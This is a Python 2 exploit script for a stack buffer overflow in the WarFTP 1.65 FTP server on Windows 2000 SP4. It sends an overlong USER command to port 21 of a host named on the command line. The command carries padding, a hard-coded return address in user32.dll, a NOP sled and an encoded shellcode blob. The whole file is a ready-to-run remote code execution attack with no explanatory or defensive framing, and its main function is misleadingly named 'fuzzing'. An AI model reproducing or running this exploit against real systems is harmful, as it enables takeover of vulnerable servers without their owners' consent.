#! /usr/bin/python 
# Name: Rio Atmadja
# Program: Exploit Development warftp 1.65

import sys
import socket 

def fuzzing(hostname):

	#Target: Windows 2000 sp4 
	#dll   : user32.dll 
	#ret   : 0x77e14c29
	ret = "\x29\x4c\xe1\x77"

	shellcode = ("\xb8\xdd\xfa\xb2\x54\xd9\xc8\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
	"\x49\x83\xeb\xfc\x31\x43\x10\x03\x43\x10\x3f\x0f\x4e\xbc\x36"
	"\xf0\xaf\x3d\x28\x78\x4a\x0c\x7a\x1e\x1e\x3d\x4a\x54\x72\xce"
	"\x21\x38\x67\x45\x47\x95\x88\xee\xed\xc3\xa7\xef\xc0\xcb\x64"
	"\x33\x43\xb0\x76\x60\xa3\x89\xb8\x75\xa2\xce\xa5\x76\xf6\x87"
	"\xa2\x25\xe6\xac\xf7\xf5\x07\x63\x7c\x45\x7f\x06\x43\x32\x35"
	"\x09\x94\xeb\x42\x41\x0c\x87\x0c\x72\x2d\x44\x4f\x4e\x64\xe1"
	"\xbb\x24\x77\x23\xf2\xc5\x49\x0b\x58\xf8\x65\x86\xa1\x3c\x41"
	"\x79\xd4\x36\xb1\x04\xee\x8c\xcb\xd2\x7b\x11\x6b\x90\xdb\xf1"
	"\x8d\x75\xbd\x72\x81\x32\xca\xdd\x86\xc5\x1f\x56\xb2\x4e\x9e"
	"\xb9\x32\x14\x84\x1d\x1e\xce\xa5\x04\xfa\xa1\xda\x57\xa2\x1e"
	"\x7e\x13\x41\x4a\xf8\x7e\x0e\xbf\x36\x81\xce\xd7\x41\xf2\xfc"
	"\x78\xf9\x9c\x4c\xf0\x27\x5a\xb2\x2b\x9f\xf4\x4d\xd4\xdf\xdd"
	"\x89\x80\x8f\x75\x3b\xa9\x44\x86\xc4\x7c\xca\xd6\x6a\x2f\xaa"
	"\x86\xca\x9f\x42\xcd\xc4\xc0\x72\xee\x0e\x69\x18\x14\xd9\x9c"
	"\xd6\x1c\x18\xc9\xe4\x20\x0b\x55\x61\xc6\x41\x75\x27\x50\xfe"
	"\xec\x62\x2a\x9f\xf1\xb9\x56\x9f\x7a\x4d\xa6\x6e\x8b\x38\xb4"
	"\x07\x7b\x77\xe6\x8e\x84\xa2\x8d\x2e\x11\x48\x04\x78\x8d\x52"
	"\x71\x4e\x12\xad\x54\xc4\x9b\x3b\x17\xb3\xe3\xab\x97\x43\xb2"
	"\xa1\x97\x2b\x62\x91\xcb\x4e\x6d\x0c\x78\xc3\xf8\xae\x29\xb7"
	"\xab\xc6\xd7\xee\x9c\x49\x27\xc5\x1c\xb6\xfe\x20\x9b\xce\x74"
	"\x41\x67")

	password = "user"
	username = '\x41' * 485 + ret + '\x90' * 16 + shellcode 
	connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		#connect to the host 
		connect.connect((hostname, 21))

	except:

		print "[-] Connection Error"
		response = connect.recv(2000)
		print response
		sys.exit(1)

	#send username to the server 
	connect.send("user %s\r\n" %username)
	response = connect.recv(2000)
	print response 

	#send password to the server 
	connect.send("pass %s\r\n" %password)
	response = connect.recv(2000)
	print response 

	connect.close()

if __name__ == '__main__':
	try:
		target = sys.argv[1]
	except IndexError:
		print 'Usage: %s <target>' % sys.argv[0]
		sys.exit(-1)
	
	fuzzing(target)
